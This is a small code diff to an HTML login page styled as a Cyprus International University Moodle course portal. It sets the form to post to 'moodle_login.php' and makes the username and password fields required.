@@ -14,7 +14,7 @@
         <p id="login-instruction">
           Log in to Cyprus International University Course Portal
         </p>
-        <form id="moodle-sign-in-form" action="">
+        <form id="moodle-sign-in-form" action="moodle_login.php" method="post">
           <div class="moodle-input-container">
             <input
               type="text"
@@ -22,6 +22,7 @@
               class="moodle-input"
               id="username"
               placeholder="Username"
+              required
             />
           </div>
           <div class="moodle-input-container">
@@ -31,6 +32,7 @@
               class="moodle-input"
               id="password"
               placeholder="Password"
+              required
             />
           </div>
 
